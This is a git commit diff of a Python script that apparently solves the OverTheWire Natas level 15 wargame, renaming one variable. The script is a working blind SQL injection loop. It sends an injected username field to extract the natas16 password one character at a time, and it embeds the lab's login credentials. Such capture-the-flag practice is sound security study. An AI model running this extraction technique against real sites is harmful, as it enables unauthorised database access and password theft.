ca862cb1e60bb8b0fe1a0b7d7857cb87b0b3ad72
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2025-09-30 17:08:14 +0300

    Update natas_15.py

--- wargames/natas_15.py
+++ wargames/natas_15.py
@@ -2,14 +2,14 @@ import requests
 from requests.auth import HTTPBasicAuth
 
 try:
-	payload = ""
+	flag = ""
 	print("\nStart..\n")
 	for pos in range(1,33):
 		for ch in range(32,  127):
 			resp = requests.post("http://natas15.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"), data={"username": "admin\" OR ASCII(SUBSTR((SELECT password FROM users WHERE username='natas16'),{},1))={}-- -".format(pos, ch)})
 			if "This user exists." in resp.text:
-				payload += chr(ch)
-				print(payload)
+				flag += chr(ch)
+				print(flag)
 				break
 		print("Position: {}\n".format(pos))
 	print("\nFinished\n")
